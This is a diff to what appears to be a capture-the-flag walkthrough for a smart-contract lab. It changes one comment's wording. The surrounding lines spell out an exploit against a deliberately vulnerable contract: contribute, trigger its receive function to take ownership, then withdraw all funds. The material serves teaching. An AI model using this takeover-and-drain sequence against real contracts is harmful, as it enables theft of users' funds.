@@ -44,6 +44,6 @@
 await contract.contribute({ value: toWei("0.000001") }) // contribute first, so that you'll be able to call receive
 await contract.getContribution().then(fund => fromWei(fund.toString())) // confirm if you have contributed
 await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) // call receive with some ether sent
-await contract.owner() === player // check if you're the owner now
+await contract.owner() === player // check if we're the owner now
 await contract.withdraw() // take all the funds out from the contract!!!
 ```
